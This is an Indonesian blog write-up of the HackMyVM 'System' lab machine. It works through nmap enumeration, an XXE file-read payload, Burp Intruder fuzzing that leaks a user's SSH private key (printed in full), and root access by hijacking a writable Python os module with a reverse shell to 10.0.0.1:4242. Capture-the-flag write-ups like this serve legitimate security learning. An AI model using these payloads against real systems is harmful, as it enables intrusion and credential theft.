---
layout: post
title: "HackMyVM: System"
date: 2022-05-16
categories: hackmyvm
tags: [XXE, fuzzing, LFI, burp-intruder]
---

Nulis-nulis lagi untuk mengisi tulisan blog dan sekaligus untuk menjenuhkan pikiran dari kehidupan yang melelahkan. keren ga tuh berima kalimatnya, hehehe. dengan mesin dari [hackmyvm](https://hackmyvm)
berkategori **Easy** ini telah menambah persoalan mulai dari injeksi XXE (XML External Entity) untuk mendapatkan *local file read* atau *inclusion* sampai fuzzing dari user directory untuk mendapatkan
password, dan selebihnya anda bisa membaca sendiri untuk belajar lebih lanjut mengenai elevasi terhadap root.

## enumeration
sebelum itu jadikan IP sebagai variable biar gampang aja.
```sh
╭─ via [machines/system] ‹node-›  ‹›
╰─ victim=192.168.56.19
```
scanning port biasa lah.
```sh
╭─ via [machines/system] ‹node-›  ‹›
╰─ cat scan_tcp.nmap
# Nmap 7.92 scan initiated Mon May 16 13:28:57 2022 as: nmap -vvv -p 22,80 -sCV -A -oN scan_tcp.nmap 192.168.56.18
Nmap scan report for 192.168.56.18
Host is up, received syn-ack (0.00042s latency).
Scanned at 2022-05-16 13:29:05 WIB for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjRCpLEF00zJy/GkOtP8umEO3vDUpsiovHmmmfKN5njf5d4aqXBW3wUjqVL3VotabyslG6gNZnaPODVt2z3MdHsyNBuJZrbRrN26Dmz3x6pzJPnizxq2AXGzfgL89jQi83yr72gb2FpxGXm8BqYTTXwbiF7NIi+ekTmRWBa6LUQHgirqggrUq5xdmj0lTu+lMQ2Tzy4xfL6BKgyg4IaZlO9Kz9Z02ghG6VDr2vV9aInO4gu/i2nlvM+aErvWyREoqspjvhgPd0Q950AkOkKfjD5hHxLFZo7aR3PHJev+8zrKwsv/6bUAQIl8nUYifu/a+1vpSddyl37ikQNLY7RsCboBNtPryz7czF1UUtWMlICTHegrchZT3FEr+c5g51hEj+AkwwQoan2y8SCMhKIbWQQH0qBWNXnfNpKGS5y8Vn8s6KqZlsPq49/k9Pmr0jplaqgKDrPuiddGOehu5Yh6Fg5jsk5c5zXttWY17TyJdeab1LBOBJMY2ur4ZnSh+zv7E=
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOAIZW58yN/LbK35zNnyYvo4vNm1bnBkyDn4KzLYYyGBG2owUbmMp8WcmKWxT5ImSPDUE24mlhafaDEb8smp1Mc=
|   256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB57U+4lDKyoTXGtTCBdDtmnL1YvIhNjQpbp/tdjDYGx
80/tcp open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: HackMyVM Panel
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 16 13:29:12 2022 -- 1 IP address (1 host up) scanned in 14.29 seconds

```
22, seperti biasa mempunyai service SSH. dan 80 adalah service dari nginx untuk http.

## 80 - register page

 langsung dihadapi dengan register page ya, sangat mengesalkan sekali.

![taibebek](https://i.ibb.co/645fFTY/loginpage.png)

lalu saya masukkan random user seperti *fuckicx* dan password sama seperti user. lalu saya klik tombolnya suddenly memunculkan messagebox seperti gambar dibawah ini.

![eek](https://i.ibb.co/2KkCs2C/image.png).

## -> directory brute-force.

untuk menguji kebenaran tentang registerednya user. maka saya berinisiatif untuk mencari dimana login page-nya.

```sh 
╭─ via [machines/system] ‹node-›  ‹›
╰─ cat gobuster.scan
/index.html           (Status: 200) [Size: 1094]
/js                   (Status: 301) [Size: 169] [--> http://192.168.56.18/js/]
/magic.php            (Status: 200) [Size: 85]
```
oh ternyata-oh ternyata, output yang saya dapat cukup simple, karena kategori easy jadi tidak heran.

## -> intercept POST traffic & burp methodologies

ternyata ketika saya *intercept*, requestnya menggunakan *POST* dengan isi data beralih menjadi *XML* cukup menarik untuk saya pikir dijadikan **XXE**.

![gambar](https://i.ibb.co/hRv1yXr/image.png)

lalu data ini saya kirim ke repeater untuk advanced testing. dan jangan lupa dari **hacktricks** sebuah payload XXE untuk file-read.

```xml
<!DOCTYPE foo [
<!ENTITY data SYSTEM "file:///etc/passwd"> 
]><exampledata>&data;</exampledata>
```
dari screenshot dibawah ini sudah terbukti bahwa injeksi untuk *file-read* berhasil.

![gambar2](https://i.ibb.co/wB6J2sc/image.png)

dari **/etc/passwd** saya bisa melihat hanya ada **david** di system ini sebagai user yang tesertakan.
maka dari sini saya mencari tahu dimana letak **id_rsa** untuk login ke shell lewat **SSH** service atau semacam password yang disimpan oleh user ini.
dari kasus ini juga, saya berfikir untuk mengambil cara *brute-force* ke *$HOME* path user ini menggunakan fitur burp yaitu, **Intruder** untuk memvalidasi apakah path dari **.ssh**
ada dalam directory user ini.

![gambar3](https://i.ibb.co/TtzZp7N/image.png)

saya khususkan fuzzing ini terhadap file/directory dibelakangan content *david*, yaitu saya namakan **something**. tambahkan *payload* di opsi *Payloads*, dan btw *payload* yang saya gunakan adalah:
```
/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/opt/SecLists/Discovery/Web-Content/quickhits.txt
```
lalu saya klik tombol start untuk memulai eksekusi. dan jika sudah selesai klik tabel *Length* untuk meratakan sesuatu yang sama ke arah atas, dan meminoritaskan yang beda dibawah.

![gambar4](https://i.ibb.co/NsStS4M/image.png)

terdapat beberapa file semacam **id_rsa**, **id_rsa.pub**, **.profile**, dll. di hasil *brute-force* tersebut. maka saya check apakah bisa log menggunakan **SSH**?.

![id_rsa](https://i.ibb.co/rHf6X7M/image.png)

versi lengkapnya ada dibawah sini.

```cs
 -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
lalu ketika saya coba, this system still asks for the password.

![askpassword](https://i.ibb.co/MZf2LM3/image.png)

lalu saya berganti arah dan mencoba untuk melihat *response* dari result *brute-force* tadi dan menemukan kejanggalan pada file **.viminfo**.

```vim
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 16 May 2022 07:40:22 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 786

<p align='center'> <font color=white size='5pt'> # This viminfo file was generated by Vim 8.2.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq!
|2,0,1648909714,,"wq!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# Password file Created:
'0  1  3  /usr/local/etc/mypass.txt
|4,48,1,3,1648909714,"/usr/local/etc/mypass.txt"

# History of marks within files (newest to oldest):

> /usr/local/etc/mypass.txt
	*	1648909713	0
	"	1	3
	^	1	4
	.	1	3
	+	1	3
 is already registered! </font> </p>
```

ada orang sebodoh ini menyimpan passwordnya pada komputernya sendiri, hadeh. sebenarnya tidak masalah cuma kaya aneh saja kenapa tidak di cloud atau dimana gitu kalau mau lebih aman.
entah si selera orang beda-beda, dan mungkin ini termasuk *human error* ya. dan lanjut, ketika saya read file nya and yeah saya mendapatkan passwordnya.

![damn](https://i.ibb.co/JjkKYvZ/image.png)

## shell as david

![shell](https://i.ibb.co/Lt63Htp/image.png)

## privilege escalation

saya sudah menjalankan **linpeas** sebuah automated script untuk mengakses berbagai metode ke privesc. tapi mungkin saya kurang analitis terhadap hal ini, jadi saya pindah untuk mencoba metode lain 
ya, dengan menggunakan **pspy** dan saya menemukan hal menarik.

![pspy](https://i.ibb.co/3M69dpN/image.png)

tiba-tiba ada *python script* tereksekusi secara automasi dari UID root. lalu saya mencoba untuk membaca kode jika mempunyai permission.

![lmfao](https://i.ibb.co/sFB3z8p/image.png)
```py
from os import system
from pathlib import Path

# Reading only first line
try:
    with open('/home/david/cmd.txt', 'r') as f:
        read_only_first_line = f.readline()
    # Write a new file
    with open('/tmp/suid.txt', 'w') as f:
        f.write(f"{read_only_first_line}")
    check = Path('/tmp/suid.txt')
    if check:
        print("File exists")
        try:
            os.system("chmod u+s /bin/bash")
        except NameError:
            print("Done")
    else:
        print("File not exists")
except FileNotFoundError:
    print("File not exists")
```
dari *source code* sendiri dinyatakan bahwa jika kita menambahkan file **cmd.txt** ke **$HOME** path user dengan menambahkan apa saja di first line, dan juga menambahkan file text di 
path **/tmp** dengan nama **suid.txt** maka script akan menjalankan sebuah perintah **chmod +s** yaitu SUID atau semacam spesial permission untuk *executable* yang dimana secara harfiah
user apapun tanpa privilege apapun bisa mengeksekusi executable. tapi ketika saya coba hasilnya nihil.

![aduh](https://i.ibb.co/k5n0tBK/image.png)

lalu saya berfikir dari *source code* juga ada module yang dipakai, apakah writable atau tidak lalu saya mencoba untuk ngecek.

![waw](https://i.ibb.co/TqDcFXb/image.png)

dengan begitu saya tambahkan reverse shell python di module script **os** tadi.

```py 
import socket,subprocess,os 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

![gambarlmfao](https://i.ibb.co/861rcRL/image.png)

itu bukan double quote, harusnya pake single quote salah screenshot saya. menggunakan ini **'**.

![kontoldon](https://i.ibb.co/QD4Pg6z/image.png)

and boom, we got the root.
## Referensi

* <https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-results>
* <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
* <https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file>
